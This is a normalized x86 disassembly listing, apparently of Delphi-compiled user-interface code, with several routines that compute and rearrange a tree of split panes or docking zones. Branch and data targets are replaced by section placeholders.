mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424df8
xor eax eax
push ebp
push sub_451562
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_4251ec
xor eax eax
push ebp
push sub_45153f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_447b80
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451546
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_4251ec
retn
sub_451574
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_451608
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_451590
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_451608
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_451c00
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_451608
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_45163c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_4516cc
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov edx 0x2
call sub_4516cc
jmp r-xdata
retn
sub_451684
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_451738
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov edx 0x2
call sub_451738
jmp r-xdata
retn
sub_4516cc
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_451b00
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_451738
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_4515ec
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_451b00
push eax
mov eax esi
call sub_45163c
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_451b00
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_4517e8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4515ec
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_451c00
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_451738
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4515ec
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_451738
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_45163c
mov edx eax
add edx esi
mov eax ebx
call sub_451b28
mov edx edi
mov eax ebx
call sub_451b28
jmp r-xdata
mov eax ebx
call sub_451988
mov eax ebx
call sub_451bd8
mov ebx eax
test ebx ebx
jne r-xdata
sub_451890
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404164
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4041b8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
sub_4518d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403564
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_451945
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_449ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_451958
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_451bd8
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_451988
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_451738
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_451738
mov esi eax
push ebp
call sub_451958
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451bd8
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4516cc
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4516cc
mov ecx ebx
pop edx
call sub_41728c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_448974
mov eax [ ebp - 0x4 ]
call sub_451b00
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_451b00
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_451b00
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_451b00
push ebx
mov ebx eax
mov eax ebx
call sub_451608
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_451590
test al al
je r-xdata
mov eax ebx
call sub_45163c
pop ebx
retn
sub_451b3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451b28
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4515d8
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_451b2c
mov edx esi
call sub_451b3c
sub_451b78
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_451b00
mov edi eax
mov eax ebx
call sub_45163c
cmp edi eax
jl r-xdata
mov eax esi
call sub_4517e8
mov eax [ esi + 0x1c ]
push eax
push sub_453688
mov edx esi
call sub_451eb4
mov eax ebx
call sub_451b00
mov edi eax
mov eax esi
call sub_451684
cmp edi eax
jle r-xdata
mov eax ebx
call sub_451b78
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_451be4
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_451608
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_451c0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403338
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4036b4
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4515b4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247fc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_429984
mov edx eax
mov eax ebx
call sub_424978
mov eax [ ebp - 0x4 ]
call sub_451ddc
xor eax eax
push ebp
push sub_451d18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_4517e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d1f
mov eax [ ebp - 0x4 ]
call sub_451de0
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44c4a8
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_451d1f
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_453bb0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_451d74
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_452de0
mov eax [ esi + 0x10 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_451df4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_451df4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_451df4
pop ecx
sub_451e4c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_451df4
pop ecx
sub_451e78
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_451e78
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_451e78
pop ecx
sub_451ecc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_451e4c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_451738
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_451738
push eax
mov edx 0x1
mov eax ebx
call sub_4516cc
push eax
mov edx 0x2
mov eax ebx
call sub_4516cc
pop edx
pop ecx
call sub_41728c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402d24
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_451f50
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_451988
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41728c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_448974
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4515b4
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_451e4c
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_4515d8
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_452e78
mov edx esi
mov eax ebx
call sub_451e4c
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_448f58
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4515b4
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_448f44
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_451738
mov edx eax
mov eax edi
call sub_451b28
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_451738
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_451738
mov edx eax
mov eax edi
call sub_451b28
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_451738
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_452160
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_452308
jmp r-xdata
sub_452160
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4515b4
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_451b00
mov edx eax
mov eax ebx
call sub_451b28
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_451b28
mov eax [ esi + 0x64 ]
call sub_451b00
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4531d0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_451eb4
mov eax [ esi + 0x64 ]
call sub_451b00
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4531d0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_451eb4
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_453554
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_451eb4
mov eax [ esi + 0x64 ]
call sub_451b00
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_453688
xor edx edx
mov eax esi
call sub_451eb4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_451b28
adc edx 0x0
mov eax ebx
call sub_4517e8
mov eax ebx
call sub_451b78
push esi
push sub_453688
xor edx edx
mov eax esi
call sub_451eb4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_452308
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_4517e8
mov eax [ ebx + 0x14 ]
call sub_451b78
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_452380
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_451b00
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_451b00
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_451b00
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_4516cc
mov esi eax
mov edx 0x2
mov eax ebx
call sub_4516cc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_451b00
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_451bd8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
